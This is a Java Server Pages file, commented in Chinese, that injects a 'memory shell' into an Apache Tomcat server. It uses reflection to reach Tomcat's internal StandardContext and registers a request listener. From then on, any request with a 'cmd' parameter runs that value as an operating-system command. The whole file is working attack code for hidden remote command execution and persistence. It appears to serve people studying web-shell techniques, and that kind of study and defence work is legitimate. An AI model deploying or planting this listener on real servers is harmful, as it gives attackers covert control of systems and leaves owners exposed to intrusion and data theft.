<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>

<%!
    public class MemShell_Listener implements ServletRequestListener {

        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }

        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
%>

<%
    //System.out.println(request.getClass().getName());   //org.apache.catalina.connector.RequestFacade

    // 获取 ServletContext 的类
    ServletContext servletContext = request.getServletContext();

    Class servletContextClass = servletContext.getClass();
    //System.out.println("当前拿到的servletContext类型是：" + servletContext.getClass().getName()); //当前拿到的servletContext类型是：org.apache.catalina.core.ApplicationContextFacade
    //因为ApplicationContextFacade类的属性是：private final ApplicationContext context;，也就是说context属性是ApplicationContext类型，继续

    // 尝试获取名为 "context" 的字段，并且暴力获取private私有属性
    Field contextField = servletContextClass.getDeclaredField("context");
    contextField.setAccessible(true);

    // 从 ServletContext 对象中获取 context 字段的值
//    Object contextObject = contextField.get(servletContext);
//    System.out.println(contextObject.getClass()); //class org.apache.catalina.core.ApplicationContext

    /*// 判断获取的对象是否是 StandardContext 类型
    if (contextObject instanceof StandardContext ) {
        StandardContext standardContext = (StandardContext) contextObject;
        System.out.println("转换为StandardContext");
    } else {
        System.out.println("转换失败");
    }*/

    ApplicationContext applicationContext = (ApplicationContext) contextField.get(servletContext);

    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    MemShell_Listener memShell_Listener = new MemShell_Listener();
    standardContext.addApplicationEventListener(memShell_Listener);
%>